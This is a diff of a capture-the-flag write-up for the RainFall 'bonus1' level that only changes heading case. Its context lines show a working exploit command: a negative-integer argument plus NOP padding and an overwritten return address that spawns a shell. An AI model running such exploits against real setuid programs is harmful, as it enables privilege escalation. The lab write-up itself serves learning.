@@ -1,6 +1,6 @@
-# Bonus1
+# bonus1
 
-## Exploring the binary
+## exploring the binary
 ```shell
 bonus1@RainFall:~$ ./bonus1
 Segmentation fault (core dumped)
@@ -74,7 +74,7 @@ The final step is to invoke <code>/bin/bash</code>. We have already observed tha
 ```
 Due to this, our exploit jumps to the address <code>0x08048482</code> to continue executing the desired sequence.
 
-## Exploit
+## exploit
 ``` shell
 bonus1@RainFall:~$ ./bonus1 -1073741799 $(python -c 'print "\x90" * 56 + "\x08\x04\x84\x82"[::-1]')
 $ whoami
